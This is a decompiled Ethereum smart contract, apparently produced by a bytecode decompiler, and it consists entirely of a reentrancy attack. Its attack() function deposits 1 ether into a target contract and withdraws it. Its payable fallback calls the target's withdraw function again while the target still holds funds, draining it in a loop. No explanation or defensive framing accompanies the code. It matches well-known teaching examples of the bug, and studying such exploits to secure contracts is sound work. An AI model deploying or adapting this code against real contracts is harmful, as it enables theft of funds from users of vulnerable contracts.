contract main {




// =====================  Runtime code  =====================


const getBalance = eth.balance(this.address)


address sub_671d3435Address;

function sub_671d3435(?) {
    return sub_671d3435Address
}

function _fallback() payable {
    if eth.balance(sub_671d3435Address) >= 10^18:
        require ext_code.size(sub_671d3435Address)
        call sub_671d3435Address.0x2e1a7d4d with:
             gas gas_remaining wei
            args 10^18
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
}

function attack() payable {
    require msg.value >= 10^18
    require ext_code.size(sub_671d3435Address)
    call sub_671d3435Address.0xd0e30db0 with:
       value 10^18 wei
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(sub_671d3435Address)
    call sub_671d3435Address.0x2e1a7d4d with:
         gas gas_remaining wei
        args 10^18
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
